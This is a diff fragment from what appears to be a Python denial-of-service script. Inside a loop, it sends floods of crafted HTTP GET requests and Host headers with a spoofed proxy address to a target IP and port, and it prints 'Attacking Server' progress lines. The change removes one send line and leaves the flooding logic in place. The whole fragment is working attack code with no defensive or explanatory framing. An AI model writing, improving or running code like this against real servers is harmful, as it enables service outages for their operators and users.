@@ -53,7 +53,6 @@ try:
             s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (ip,port))
             s.sendto(("GET /" + ip + " HTTP/1.1\r\n\r\n").encode('utf-8'), (ip,port))
             s.sendto(("Host: " + str(fip) + "\r\n\r\n").encode('utf-8'), (ip,port))
-            s.sendall(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
             s.close()
             print(f"Attacking Server | {ip}:{port} Sent : ", i, f" With Proxy : {fip}", end='\r')
         except TimeoutError:
